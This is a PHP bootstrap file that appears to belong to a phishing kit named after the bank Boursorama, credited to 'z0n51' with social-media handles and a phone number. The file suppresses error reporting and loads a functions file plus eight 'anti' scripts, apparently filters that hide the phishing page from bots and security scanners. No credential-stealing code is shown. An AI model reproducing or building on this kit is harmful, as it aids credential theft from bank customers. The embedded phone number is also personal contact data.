<?php

/**
 * @link              https://www.z0n51.com/
 * @since             27/11/2020
 * @package           BOURSORAMA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOURSORAMA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

session_start();
error_reporting(0);
include_once 'functions.php';
include_once 'anti/anti1.php';
include_once 'anti/anti2.php';
include_once 'anti/anti3.php';
include_once 'anti/anti4.php';
include_once 'anti/anti5.php';
include_once 'anti/anti6.php';
include_once 'anti/anti7.php';
include_once 'anti/anti8.php';
?>